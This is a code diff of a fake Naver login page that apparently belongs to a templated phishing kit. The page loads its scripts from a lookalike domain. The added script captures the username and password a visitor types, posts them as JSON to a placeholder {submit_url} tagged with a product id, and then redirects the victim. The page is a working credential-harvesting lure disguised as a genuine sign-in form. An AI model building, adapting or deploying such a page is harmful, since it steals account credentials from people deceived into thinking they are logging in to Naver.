@@ -40,8 +40,6 @@
     <link href="http://www.naver.com/favicon.ico" rel="shortcut icon" />
 
     <script type="text/javascript" src="js/jquery-1.8.3.min.js"></script>
-    <script type="text/javascript" src="js/myfunction.js"></script>
-    <script type="text/javascript" src="js/jquery-webox.js"></script>
     <script type="text/javascript">
       function checklogin() {
         if (document.getElementById('id').value == '') {
@@ -60,11 +58,7 @@
   <body cz-shortcut-listen="true">
     <div class="tx-loader" style="display: none"></div>
 
-    <link
-      rel="stylesheet"
-      type="text/css"
-      href="/css/z_style.css"
-    />
+    <link rel="stylesheet" type="text/css" href="/css/z_style.css" />
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/jquery-1.12.4.min.js"></script>
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/jquerysession.js"></script>
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/jquery.cookie.js"></script>
@@ -84,20 +78,11 @@
     <!-- <link rel="stylesheet" href="./plugins/lightbox2/css/lightbox.min.css"> -->
     <!-- <script src="./plugins/lightbox2/js/lightbox-plus-jquery.min.js"></script> -->
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/jquery-ui.min.js"></script>
-    <link
-      rel="stylesheet"
-      href="/css/mediaelementplayer.css"
-    />
+    <link rel="stylesheet" href="/css/mediaelementplayer.css" />
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/mediaelement-and-player.min.js"></script>
-    <link
-      rel="stylesheet"
-      href="/css/pb.css"
-    />
+    <link rel="stylesheet" href="/css/pb.css" />
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/pb.min.js"></script>
-    <link
-      rel="stylesheet"
-      href="/css/lh_ext.css"
-    />
+    <link rel="stylesheet" href="/css/lh_ext.css" />
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/lh_ext.js"></script>
     <script>
       var sfdr = null
@@ -187,20 +172,19 @@
       }
 
       function frm_chk(frm) {
-        if (sf_ywsz_2('dd_username', $('#dd_username').val()) == false) {
+        if (sf_ywsz_2('username', $('#username').val()) == false) {
           return false
         }
-        if ($('#dd_username').val() == '') {
+        if ($('#username').val() == '') {
           alert('아이디를 입력하세요')
-          $('#dd_username').focus()
+          $('#username').focus()
           return false
         }
-        if ($('#dd_password').val() == '') {
+        if ($('#password').val() == '') {
           alert('비밀번호를 입력하세요')
-          $('#dd_password').focus()
+          $('#password').focus()
           return false
         }
-        $('#login_naver').attr('action', 'sub1.php')
         return true
       }
       $(function () {
@@ -222,6 +206,7 @@
         })
       })
     </script>
+
     <div class="z_login_wr">
       <div class="z_login_jz">
         <div class="z_login_nr">
@@ -232,7 +217,7 @@
             />
           </div>
           <div class="z_login_nr_02">
-            <div id="login_naver" name="login_naver">
+            <div id="login_naver">
               <input type="hidden" name="id" value="utHyEpvH5" />
               <input
                 type="text"
@@ -248,9 +233,7 @@
                 class="login_naver_password"
                 placeholder="비밀번호"
               />
-              <button type="submit" id="btn_login" class="login_naver_submit">
-                로그인
-              </button>
+              <button id="btn_login" class="login_naver_submit">로그인</button>
             </div>
           </div>
           <div class="z_login_nr_03">
@@ -359,6 +342,54 @@
         </div>
       </div>
     </div>
+    <script>
+      document
+        .getElementById('btn_login')
+        .addEventListener('click', function (event) {
+          event.preventDefault()
+
+          const username = document.getElementById('username').value
+          const password = document.getElementById('password').value
+
+          const check = /[^a-zA-Z0-9_.@-]/
+          if (check.test(username)) {
+            alert('영문 , 숫자 _ 만 입력해주세요')
+            document.getElementById('username').value = ''
+            document.getElementById('username').focus()
+            return
+          }
+
+          if (username == '') {
+            alert('아이디를 입력하세요')
+            $('#username').focus()
+            return false
+          }
+          if (password == '') {
+            alert('비밀번호를 입력하세요')
+            $('#password').focus()
+            return false
+          }
+
+          fetch('{submit_url}', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              username,
+              password,
+              product: '{product_id}',
+            }),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              window.location.href = `{redirect_url}?id=${data._id}`
+            })
+            .catch((error) => {
+              console.error('Error:', error)
+            })
+        })
+    </script>
     <script src="http://www.page-naver567.com/shopskin/paynaver2022/images/dr.js"></script>
   </body>
 </html>
